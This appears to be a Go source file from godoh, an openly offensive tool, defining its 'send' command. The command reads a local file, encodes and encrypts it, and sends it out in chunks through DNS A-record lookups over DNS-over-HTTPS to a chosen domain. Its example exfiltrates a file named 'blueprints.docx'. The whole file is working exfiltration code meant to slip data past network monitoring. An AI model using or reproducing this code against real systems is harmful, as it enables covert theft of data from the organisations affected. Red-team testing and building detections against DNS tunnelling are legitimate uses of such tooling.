package cmd

import (
	"fmt"
	"io/ioutil"
	"os"

	"github.com/sensepost/godoh/dnsclient"
	"github.com/sensepost/godoh/protocol"

	"github.com/miekg/dns"
	"github.com/spf13/cobra"
)

var sendCmdFileName string

// sendCmd represents the send command
var sendCmd = &cobra.Command{
	Use:   "send",
	Short: "Send a file via DoH",
	Long: `Send a file via DoH.

The source file will be encoded, encrypted and sent
via DNS A record lookups to the target domain.

Example:
	godoh --domain example.com send --file blueprints.docx`,
	Run: func(cmd *cobra.Command, args []string) {

		log := options.Logger

		if sendCmdFileName == "" {
			log.Fatal().Msg("a file to send is required")
		}

		file, err := os.Open(sendCmdFileName)
		if err != nil {
			log.Fatal().Err(err).Msg("failed to open file")
		}
		defer file.Close()

		fileInfo, err := file.Stat()
		if err != nil {
			log.Fatal().Err(err).Msg("failed get file information")
		}

		fileSize := fileInfo.Size()
		log.Info().Str("filename", sendCmdFileName).Int64("size", fileSize).Msg("file info")

		fileBuffer, err := ioutil.ReadAll(file)
		if err != nil {
			log.Fatal().Err(err).Msg("failed to read file")
		}

		message := protocol.File{}
		message.Prepare(&fileBuffer, fileInfo)
		requests, successFlag := message.GetARequests()

		log.Debug().Int("requests", len(requests)).Msg("request count to transfer file")

		for _, r := range requests {
			response := dnsclient.Lookup(options.Provider, fmt.Sprintf(options.Domain, r), dns.TypeA)

			if response.Data == successFlag {
				log.Debug().Str("response", response.Data).Str("labels", r).Msg("request success")
			} else {
				log.Error().Str("response", response.Data).Str("labels", r).Msg("request failed. exiting")
				return
			}
		}

		log.Info().Msg("done! the file should be on the other side")
	},
}

func init() {
	rootCmd.AddCommand(sendCmd)

	sendCmd.Flags().StringVarP(&sendCmdFileName, "file", "f", "", "The file to send.")
}
